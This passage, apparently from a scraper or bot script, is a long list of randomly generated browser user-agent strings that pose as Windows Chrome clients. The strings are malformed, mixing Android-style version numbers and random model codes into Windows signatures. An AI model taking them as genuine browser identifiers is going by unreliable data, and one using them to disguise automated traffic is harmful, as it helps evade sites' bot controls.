Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)I936B) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4768.95 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A273Z) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4897.138 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B602A) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4536.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)H512T) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4261.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D808A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4601.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W850E) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4271.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K43A) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4874.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z608T) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4339.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R280V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4618.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T385O) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4589.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A724K) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4836.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)U478V) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4392.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N3E) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4453.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N100B) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4342.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Z431S) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4699.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)I220Z) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4487.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q241J) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4510.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K394P) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4575.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E548C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4378.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D124E) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4800.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H362I) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4497.132 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G289R) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4827.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S156X) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4463.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z843C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4591.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)W759G) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4479.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F586M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4279.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P587E) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4251.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)N842D) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4374.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W916I) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4227.78 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K898M) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4416.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)V262P) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4812.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O143O) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4720.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V615P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4850.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W39G) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4786.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J13K) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4248.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A717A) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4468.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C399D) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4559.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q636S) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4210.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V396V) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4446.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z128A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4800.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)J152O) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4759.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V725N) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4845.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F411U) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4418.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Y815R) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4434.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L862T) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4608.50 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B665O) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4898.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F802P) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4588.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S518R) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4859.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H786F) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4891.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)X626D) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4540.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y197F) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4790.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O289M) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4598.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H777J) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4333.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z637O) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4207.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C675A) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4222.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T896X) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4842.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A135U) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4295.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Q998S) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4858.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N770C) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4417.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C897C) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4414.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K19T) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4728.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C301M) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4551.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N894G) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4744.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F963D) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4402.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T139D) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4254.129 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T525F) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4389.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z689E) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4475.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S460F) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4301.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y866V) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4566.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N466O) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4335.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N724N) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4458.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)C66M) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4427.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)S783T) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4670.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X32A) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4514.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K722I) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4706.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y869Q) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4394.59 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H211F) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4740.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A877Y) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4871.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q662A) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4603.92 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E98G) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4554.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A719X) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4359.70 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y492E) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4504.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A528J) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4790.72 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D717A) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4646.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K975U) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4416.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K192H) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4797.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N525D) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4737.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)F184D) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4479.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X708B) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4645.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)U383J) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4609.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E810B) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4761.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K806B) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4778.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T890K) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4878.93 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G689Q) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4753.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A141L) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4827.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P571J) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4472.110 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N238M) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4655.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E271M) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4598.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O882L) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4475.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U924W) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4781.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H667S) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4686.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G648D) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4835.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)D626D) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4509.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E266W) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4656.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R377T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4284.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L437P) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4579.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)U388V) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4641.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)G282N) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4458.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P527G) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4726.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J10C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4650.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K602D) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4251.71 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H445A) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4404.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S611R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4838.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H893D) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4755.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)W714L) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4829.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)R96T) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4271.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T556P) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4867.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M701L) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4208.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S611H) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4452.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O509U) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4562.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q642X) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4444.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H348L) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4625.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F23A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4590.141 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D937L) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4661.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A769J) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4458.85 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Q421Q) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4472.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O703Q) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4853.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)T359L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4864.54 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B694F) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4732.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N314W) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4847.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Z450S) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4581.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q871W) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4239.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B587O) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4610.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K164H) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4457.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C360M) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4504.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P819B) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4795.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B853X) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4472.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F537Q) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4651.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B906A) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4534.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N138X) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4790.96 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B861U) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4498.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)N398M) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4326.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)W337G) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4330.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H489G) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4852.61 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Z347O) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4746.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Z656S) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4846.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P420A) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4782.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A827U) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4657.50 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V20T) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4459.144 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)I265P) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4709.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)S496D) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4491.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)F912T) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4481.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)I876O) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4517.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D52L) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4603.76 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X399Z) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4557.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F675H) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4401.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y943N) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4390.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C365F) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4557.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q843Q) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4437.89 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A707A) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4353.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q85E) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4455.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A578Z) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4742.133 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O15F) AppleWebKit/537.36 